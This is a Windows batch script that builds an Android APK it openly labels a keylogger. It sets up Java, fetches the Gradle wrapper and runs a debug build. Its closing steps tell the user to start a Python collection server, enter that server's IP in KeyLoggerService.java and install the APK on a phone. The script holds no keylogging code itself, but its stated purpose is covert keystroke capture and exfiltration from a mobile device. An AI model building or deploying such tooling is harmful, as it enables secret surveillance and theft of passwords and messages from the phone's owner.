@echo off
echo ========================================
echo    BUILDING KEYLOGGER APK
echo ========================================

echo 1. Setting Java environment...
set "JAVA_HOME=C:\Program Files\Eclipse Adoptium\jdk-8.0.462.8-hotspot"
set "PATH=%JAVA_HOME%\bin;%PATH%"

echo 2. Downloading Gradle Wrapper...
if not exist "gradle\wrapper\gradle-wrapper.jar" (
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/gradle/gradle/raw/v6.7.1/gradle/wrapper/gradle-wrapper.jar' -OutFile 'gradle\wrapper\gradle-wrapper.jar'"
)

echo 3. Creating gradlew script...
(
echo @echo off
echo.
echo setlocal
echo set "DIRNAME=%%~dp0"
echo if "%%DIRNAME%%" == "" set DIRNAME=.
echo set APP_BASE_NAME=%%~n0
echo set APP_HOME=%%DIRNAME%%
echo.
echo set "JAVA_HOME=C:\Program Files\Eclipse Adoptium\jdk-8.0.462.8-hotspot"
echo.
echo set JAVA_EXE=%%JAVA_HOME%%\bin\java.exe
echo.
echo if exist "%%JAVA_EXE%%" (
echo   "%%JAVA_EXE%%" -Dorg.gradle.appname=%%APP_BASE_NAME%% -classpath "%%APP_HOME%%\gradle\wrapper\gradle-wrapper.jar" org.gradle.wrapper.GradleWrapperMain %%*
echo ) else (
echo   echo ERROR: Java not found at %%JAVA_HOME%%
echo   exit /b 1
echo )
echo.
endlocal
) > gradlew.bat

echo 4. Building APK...
call gradlew.bat assembleDebug

if %errorlevel% == 0 (
    echo.
    echo ========================================
    echo   ✅ BUILD SUCCESSFUL!
    echo ========================================
    echo APK location: app\build\outputs\apk\debug\app-debug.apk
    echo.
    echo Next steps:
    echo 1. Run: python server.py
    echo 2. Check IP address and update in KeyLoggerService.java
    echo 3. Install APK on phone
    echo.
    pause
) else (
    echo.
    echo ========================================
    echo   ❌ BUILD FAILED!
    echo ========================================
    echo.
    pause
)